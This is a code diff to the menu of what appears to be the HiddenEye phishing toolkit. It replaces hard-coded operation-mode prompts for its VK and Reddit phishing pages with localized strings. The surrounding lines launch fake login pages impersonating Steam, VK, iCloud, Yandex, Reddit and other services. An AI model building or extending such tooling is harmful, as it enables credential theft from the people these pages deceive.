@@ -101,8 +101,11 @@ def start_main_menu():
         start_phishing_page('Steam', customOption)
     elif option == '14':
         module_loading_message('VK')
-        customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(default_palette[0], default_palette[4], default_palette[2]))
+        #customOption = input(
+        #    "\nOperation mode:\n
+        print(localization.lang_start_main_menu["operation_mode"])
+        print_sorted_as_menu(localization.lang_start_main_menu["VK_operation_modes"])
+        customOption = input(global_localization.input_line)
         start_phishing_page('VK', customOption)
     elif option == '15':
         module_loading_message('iCloud')
@@ -186,8 +189,11 @@ def start_main_menu():
         start_phishing_page('Yandex', customOption)
     elif option == '35':
         module_loading_message('Reddit')
-        customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        #customOption = input(
+        #    "\nOperation mode:\nHiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        print(localization.lang_start_main_menu["operation_mode"])
+        print_sorted_as_menu(localization.lang_start_main_menu["reddit_operation_modes"])
+        customOption = input(global_localization.input_line)
         start_phishing_page('Reddit', customOption)
     elif option == '36':
         module_loading_message('Subitoit')
